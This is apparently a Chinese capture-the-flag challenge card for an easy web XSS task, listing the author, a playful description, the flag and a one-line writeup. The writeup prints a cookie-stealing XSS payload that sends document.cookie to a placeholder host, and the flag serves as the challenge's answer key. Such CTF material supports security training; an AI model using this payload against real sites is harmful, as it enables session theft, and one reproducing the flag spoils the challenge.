* **题目名称：** kk园区审核员

* **题目类型：** WEB

* **题目难度：** 容易 

* **出题人：** pANz0e

* **考点：**  

1. xss


* **描述：**  善良的出题人组织了一次kk园区的参观活动，现在收集有意向前往的人员信息，提交后工作人员会第一时间审核哦，审核通过还能得到审核的美味曲奇奖励！~

* **flag：** xsctf{Y0u_succ3s5ful1y_x55_m3}

* **Writeup：** 随便找个xss地方`<script>new Image().src="http://ip:port/"+document.cookie</script>`，点击提交即可
